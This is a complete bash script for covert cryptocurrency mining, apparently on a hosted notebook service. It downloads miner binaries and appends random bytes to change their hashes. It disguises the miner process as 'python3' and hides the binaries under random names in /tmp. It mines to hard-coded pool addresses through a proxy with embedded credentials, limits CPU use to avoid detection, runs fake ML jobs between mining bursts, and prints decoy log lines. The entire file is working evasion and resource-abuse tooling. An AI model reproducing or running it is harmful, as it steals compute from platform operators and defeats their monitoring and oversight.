#!/bin/bash
# MINN v12 — peakminer + anti-detect + burst cycle
# Pool: 23.94.152.126:80 | Proxy: yoga@107.172.222.195

PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)

# Pool & proxy dari script lu
PEAK_POOL="23.94.152.126:80"
PEAK_PROXY="socks5://yoga:yoga123@107.172.222.195:443"
TDC_POOL="47.251.244.12:80"

MINE_SEC=$((10 * 60))
REST_SEC=$((20 * 60))
SESSION=$((4 * 3600))

log() {
    local m=(
        "🔥 Masak indomie batch #$1" "🥵 Nguli bentar"
        "💨 Dorong gerobak #$1" "🍜 Nyeduh kuah"
        "🏃 Lari komplek #$1" "🧹 Nyapu"
        "🛒 Belanja antri #$1" "🐔 Kasih makan ayam"
        "📦 Packing" "☕ Bikin kopi #$1"
        "🧊 Isi es batu" "🪴 Siram tanaman"
        "🍳 Ceplok telor" "📺 Nonton tv"
    )
    echo "[$(date +%H:%M:%S)] ${m[$((RANDOM % ${#m[@]}))]}"
}

echo "=========================================="
echo "  MINN v12 — Peak Edition, Warung: $WRK"
echo "=========================================="

# === 1. Warmup ===
echo "[*] Pemanasan..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(1000,784).astype(np.float32);y=np.random.randint(0,10,1000)
for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(20)
" 2>/dev/null

# === 2. Download + padding + setup ===
echo "[*] Siapin bahan..."
apt-get install -y -qq cpulimit 2>/dev/null
rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m

wget -q https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak || exit 1
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || exit 1
chmod +x peak sse2

# Padding (ubah hash)
dd if=/dev/urandom of=peak bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s peak) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null

# Exec rename wrapper
cat > /tmp/w.c << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main(int argc,char**argv){
    if(argc<2)return 1;
    size_t l=strlen(argv[0])+1;
    memset(argv[0],0,l);strncpy(argv[0],"python3",l-1);
    execvp(argv[1],&argv[1]);return 1;
}
CEOF
gcc -o /tmp/w /tmp/w.c -s 2>/dev/null

# Copy ke tmp random name
B1="/tmp/.a$(date +%s | md5sum | head -c 6)"
B2="/tmp/.b$(date +%s | sha1sum | head -c 6)"
cp peak "$B1" && cp sse2 "$B2" && chmod +x "$B1" "$B2"

echo "[*] Siap masak."

# === Fake ML function ===
fake_ml() {
    python3 -c "
import numpy as np, time, random
end = time.time() + $1
while time.time() < end:
    x=np.random.rand(512,512).astype(np.float32)
    y=np.random.rand(512,512).astype(np.float32)
    np.dot(x,y);np.linalg.svd(x[:,:256])
    time.sleep(random.randint(30,90))
" 2>/dev/null
}

# === Mining functions ===
mine_peak() {
    /tmp/w "$B1" \
        --coin pearl \
        --url "$PEAK_POOL" \
        --user "${PRL}.${WRK}" \
        --proxy "$PEAK_PROXY" \
        2>/dev/null &
    PID1=$!
    cpulimit -l $((RANDOM % 25 + 35)) -p $PID1 2>/dev/null &
}

mine_sse2() {
    /tmp/w "$B2" \
        -a yespowertide \
        -o "$TDC_POOL" \
        -u "${TDC}.${WRK}" \
        -t 1 >/dev/null 2>&1 &
    PID2=$!
    cpulimit -l $((RANDOM % 25 + 35)) -p $PID2 2>/dev/null &
}

kill_miners() {
    kill $PID1 $PID2 2>/dev/null
    pkill -f cpulimit 2>/dev/null
}

rebuild_binaries() {
    [ -f "$B1" ] || { cp peak "$B1"; dd if=/dev/urandom of="$B1" bs=1 count=$((RANDOM%2000+512)) seek=$(stat -c%s "$B1") conv=notrunc oflag=append 2>/dev/null; chmod +x "$B1"; }
    [ -f "$B2" ] || { cp sse2 "$B2"; chmod +x "$B2"; }
}

# === LOG ===
(
    c=0
    while true; do c=$((c+1)); log "$c"; sleep $((RANDOM % 50 + 20)); done
) &
LOGPID=$!
trap "kill $LOGPID 2>/dev/null; kill_miners; rm -f /tmp/w /tmp/w.c $B1 $B2" EXIT

# === BURST CYCLE LOOP ===
END=$((SECONDS + SESSION))
CYCLE=0

while [ $SECONDS -lt $END ]; do
    CYCLE=$((CYCLE + 1))
    
    echo "[*] >>> Masak! (cycle $CYCLE, 10 menit)"
    rebuild_binaries
    mine_peak
    sleep 5
    mine_sse2
    sleep $MINE_SEC
    kill_miners
    
    if [ $SECONDS -lt $END ]; then
        echo "[*] <<< Istirahat (cycle $CYCLE, 20 menit)"
        fake_ml $REST_SEC
        
        # Extra break kadang-kadang (biar gak predictable)
        if [ $((RANDOM % 4)) -eq 0 ]; then
            log 1
            python3 -c "import time; time.sleep($((RANDOM % 600 + 300)))" 2>/dev/null
        fi
    fi
done

echo "[*] Selesai."